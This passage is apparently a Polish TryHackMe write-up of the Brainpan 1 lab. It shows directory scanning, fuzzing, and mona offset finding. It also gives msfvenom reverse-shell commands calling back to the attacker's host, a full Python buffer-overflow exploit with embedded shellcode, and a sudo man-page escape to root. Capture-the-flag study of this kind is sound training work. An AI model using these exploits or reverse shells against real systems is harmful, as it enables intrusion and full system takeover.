+|    |___ |  <span style="color:#ae81ff">\ </span>|  <span style="color:#ae81ff">\ </span>| <span style="color:#ae81ff">\_</span>_,    <span style="color:#ae81ff">\_</span>_/ / <span style="color:#ae81ff">\ </span>| |__/ |___
+by Ben <span style="color:#e6db74">&#34;epi&#34;</span> Risher 🤓                 ver: 2.3.3
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.167.88:10000
+ 🚀  Threads               │ <span style="color:#ae81ff">50</span>
+ 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/common.txt
+ 👌  Status Codes          │ <span style="color:#f92672">[</span>200, 204, 301, 302, 307, 308, 401, 403, 405, 500<span style="color:#f92672">]</span>
+ 💥  Timeout <span style="color:#f92672">(</span>secs<span style="color:#f92672">)</span>        │ <span style="color:#ae81ff">7</span>
+ 🦡  User-Agent            │ feroxbuster/2.3.3
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 📍  Follow Redirects      │ true
+ 🔃  Recursion Depth       │ <span style="color:#ae81ff">1</span>
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press <span style="color:#f92672">[</span>ENTER<span style="color:#f92672">]</span> to use the Scan Cancel Menu™
+──────────────────────────────────────────────────
+<span style="color:#ae81ff">200</span>       11l       24w      230c http://10.10.167.88:10000/bin/
+<span style="color:#ae81ff">200</span>        8l       14w      215c http://10.10.167.88:10000/index.html
+<span style="color:#f92672">[</span><span style="color:#75715e">####################] - 1m      4697/4697    0s      found:2       errors:68     </span>
+<span style="color:#f92672">[</span><span style="color:#75715e">####################] - 1m      4697/4697    50/s    http://10.10.153.181:10000</span>
+</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220905013926.png" alt=""  />
+</p>
+<p>Pobrałem .exe i zaczynam działanie na Windowsie.</p>
+<hr>
+<h1 id="testy-na-windowsie">Testy na Windowsie<a hidden class="anchor" aria-hidden="true" href="#testy-na-windowsie">#</a></h1>
+<p>Faktycznie widzimy otwarty port <code>9999</code> jak na oryginalnej maszynie.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220906022311.png" alt=""  />
+</p>
+<h2 id="fuzzer">Fuzzer<a hidden class="anchor" aria-hidden="true" href="#fuzzer">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/tryhackme/bufferoverflow<span style="color:#f92672">]</span>
+└╼<span style="color:#f92672">[</span>★ <span style="color:#f92672">]</span>$python3 fuzzer.py 
+Fuzzing with <span style="color:#ae81ff">100</span> bytes
+Fuzzing with <span style="color:#ae81ff">200</span> bytes
+Fuzzing with <span style="color:#ae81ff">300</span> bytes
+Fuzzing with <span style="color:#ae81ff">400</span> bytes
+Fuzzing with <span style="color:#ae81ff">500</span> bytes
+Fuzzing with <span style="color:#ae81ff">600</span> bytes
+Fuzzing crashed at <span style="color:#ae81ff">600</span> bytes
+</code></pre></div><p>Zatem tworzę nieco dłuższy pattern o długości <code>800</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/tryhackme/bufferoverflow<span style="color:#f92672">]</span>
+└╼<span style="color:#f92672">[</span>★ <span style="color:#f92672">]</span>$/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <span style="color:#ae81ff">800</span>
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba
+</code></pre></div><hr>
+<p>Ustawiam w konsoli:</p>
+<p><code>!mona findmsp -distance 800</code></p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220906024624.png" alt=""  />
+</p>
+<p>Jest komunikat:</p>
+<p><code>EIP contains normal pattern : 0x35724134 (offset 524) </code></p>
+<p>Z tego wynika, że zmienna <code>offset = 524</code>. Ustawiam również <code>payload=&quot;&quot;</code> oraz <code>retn = &quot;BBBB&quot;</code>. EIP po crashu powinien zwrócić <code>42424242</code>.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220906025104.png" alt=""  />
+</p>
+<p>Tak się stało. Wychodzi na to, że jedyny bad char to <code>\x00</code>.</p>
+<p><code>!mona jmp -r esp -cpb &quot;\x00&quot;</code></p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220906025734.png" alt=""  />
+</p>
+<p>Adres pointera to : <code>311712F3</code>. Do zmiennej retn odwracam ten adres.</p>
+<p><code>retn=\xf3\x12\x17\x31</code></p>
+<p>Wygenerowałem shellcode na Windowsa.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/tryhackme/bufferoverflow<span style="color:#f92672">]</span>                                       
+└╼<span style="color:#f92672">[</span>★ <span style="color:#f92672">]</span>$msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.2.128 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4445</span> EXITFUNC<span style="color:#f92672">=</span>thread -b <span style="color:#e6db74">&#34;\x00&#34;</span> -f c
+</code></pre></div><p>Finalny <code>exploit.py</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket
+ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;10.10.167.88&#34;</span>
+port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9999</span>
+
+prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">524</span>
+overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
+retn <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf3\x12\x17\x31</span><span style="color:#e6db74">&#34;</span>
+padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>
+payload<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd9\xc0\xbd\x24\xa6\x05\x04\xd9\x74\x24\xf4\x58\x29\xc9\xb1</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x12\x31\x68\x17\x03\x68\x17\x83\xcc\x5a\xe7\xf1\x3d\x78\x1f</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1a\x6e\x3d\xb3\xb7\x92\x48\xd2\xf8\xf4\x87\x95\x6a\xa1\xa7</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa9\x41\xd1\x81\xac\xa0\xb9\x1b\x47\x87\x4d\x74\x55\x27\xbc</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd8\xd0\xc6\x0e\x86\xb2\x59\x3d\xf4\x30\xd3\x20\x37\xb6\xb1</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xca\xa6\x98\x46\x62\x5f\xc8\x87\x10\xf6\x9f\x3b\x86\x5b\x29</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x5a\x96\x57\xe4\x1d</span><span style="color:#e6db74">&#34;</span>)
+postfix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+buffer <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> overflow <span style="color:#f92672">+</span> retn <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> postfix
+
+s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+
+<span style="color:#66d9ef">try</span>:
+  s<span style="color:#f92672">.</span>connect((ip, port))
+  print(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)
+  s<span style="color:#f92672">.</span>send(bytes(buffer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;latin-1&#34;</span>))
+  print(<span style="color:#e6db74">&#34;Done!&#34;</span>)
+<span style="color:#66d9ef">except</span>:
+  print(<span style="color:#e6db74">&#34;Could not connect.&#34;</span>)
+</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220907012346.png" alt=""  />
+</p>
+<p>Świetnie, działa. Teraz tylko zmieniam payload i adres IP na ten z VPN:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p linux/x86/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.8.212.116 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> EXITFUNC<span style="color:#f92672">=</span>thread -b <span style="color:#e6db74">&#34;\x00&#34;</span> -f c
+</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220907013912.png" alt=""  />
+</p>
+<hr>
+<h1 id="privilege-escalation">Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h1>
+<p><code>sudo -l</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo -l
+Matching Defaults entries <span style="color:#66d9ef">for</span> puck on this host:
+    env_reset, mail_badpass,
+    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin
+
+User puck may run the following commands on this host:
+    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /home/anansi/bin/anansi_util
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo /home/anansi/bin/anansi_util
+Usage: /home/anansi/bin/anansi_util <span style="color:#f92672">[</span>action<span style="color:#f92672">]</span>
+Where <span style="color:#f92672">[</span>action<span style="color:#f92672">]</span> is one of:
+  - network
+  - proclist
+  - manual <span style="color:#f92672">[</span>command<span style="color:#f92672">]</span>
+</code></pre></div><p>3 opcja jest nietypowa, postanowiłem popróbować różnych trików i udało mi się uzyskać roota, ponieważ dostajemy dostęp do <code>man</code>, a z niego możemy &ldquo;wyjść&rdquo; poprzez <code>!/bin/bash</code>. Ponieważ włączamy binarke z sudo, otrzymamy roota.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo /home/anansi/bin/anansi_util manual whoami                                                                                                                 <span style="color:#f92672">[</span>111/111<span style="color:#f92672">]</span>
+No manual entry <span style="color:#66d9ef">for</span> manual                                                                                                                                               
+WARNING: terminal is not fully functional                                                                                                                                
+!/bin/bash                                                                                                                                                               
+!/bin/bash                                                                                                                                                               
+id                                                                                                                                                                       
+uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+</code></pre></div><hr>
+<h2 id="root-proof">Root proof<a hidden class="anchor" aria-hidden="true" href="#root-proof">#</a></h2>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220907015949.png" alt=""  />
+</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://suszczyk.github.io/tags/linux/">Linux</a></li>
+      <li><a href="https://suszczyk.github.io/tags/easy/">Easy</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://suszczyk.github.io/posts/hackthebox/logforge/">
+    <span class="title">« Prev Page</span>
+    <br>
+    <span>LogForge - HackTheBox</span>
+  </a>
+  <a class="next" href="https://suszczyk.github.io/posts/vulnhub/netstart/">
+    <span class="title">Next Page »</span>
+    <br>
+    <span>netstart</span>
+  </a>
+</nav>
+
+
+<div class="share-buttons">
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Brainpan 1 on twitter"
+        href="https://twitter.com/intent/tweet/?text=Brainpan%201&amp;url=https%3a%2f%2fsuszczyk.github.io%2fposts%2ftryhackme%2fbrainpan-1%2f&amp;hashtags=Linux%2cEasy">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Brainpan 1 on linkedin"
+        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fsuszczyk.github.io%2fposts%2ftryhackme%2fbrainpan-1%2f&amp;title=Brainpan%201&amp;summary=Brainpan%201&amp;source=https%3a%2f%2fsuszczyk.github.io%2fposts%2ftryhackme%2fbrainpan-1%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Brainpan 1 on reddit"
+        href="https://reddit.com/submit?url=https%3a%2f%2fsuszczyk.github.io%2fposts%2ftryhackme%2fbrainpan-1%2f&title=Brainpan%201">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Brainpan 1 on facebook"
+        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fsuszczyk.github.io%2fposts%2ftryhackme%2fbrainpan-1%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Brainpan 1 on whatsapp"
+        href="https://api.whatsapp.com/send?text=Brainpan%201%20-%20https%3a%2f%2fsuszczyk.github.io%2fposts%2ftryhackme%2fbrainpan-1%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Brainpan 1 on telegram"
+        href="https://telegram.me/share/url?text=Brainpan%201&amp;url=https%3a%2f%2fsuszczyk.github.io%2fposts%2ftryhackme%2fbrainpan-1%2f">
+        <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28">
+            <path
+                d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
+        </svg>
+    </a>
+</div>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://suszczyk.github.io">Mateusz Suszczyk</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerText = 'copy';
+
+        function copyingDone() {
+            copybutton.innerText = 'copied!';
+            setTimeout(() => {
+                copybutton.innerText = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
